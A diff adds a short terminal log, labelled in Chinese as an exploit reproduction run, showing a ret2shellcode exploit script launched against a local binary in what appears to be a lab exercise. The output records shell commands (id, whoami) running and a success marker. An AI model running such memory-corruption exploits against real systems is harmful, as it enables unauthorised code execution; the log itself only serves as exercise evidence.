@@ -1,0 +1,17 @@
+复现实验终端记录 | ret2shellcode
+命令：python3 ret2shellcode_repro/exploit.py（交互阶段发送 id; whoami; echo RET2SHELLCODE_EVIDENCE_OK）
+结果：通过（exit=0）
+
+[x] Starting local process '/home/xyx/Desktop/ex2/ret2shellcode'
+[+] Starting local process '/home/xyx/Desktop/ex2/ret2shellcode': pid 26379
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 9B
+[x] Receiving all data: 138B
+[x] Receiving all data: 142B
+[*] Process '/home/xyx/Desktop/ex2/ret2shellcode' stopped with exit code 0 (pid 26379)
+[x] Receiving all data: 168B
+[+] Receiving all data: Done (168B)
+bye bye ~uid=1000(xyx) gid=1000(xyx) groups=1000(xyx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
+xyx
+RET2SHELLCODE_EVIDENCE_OK
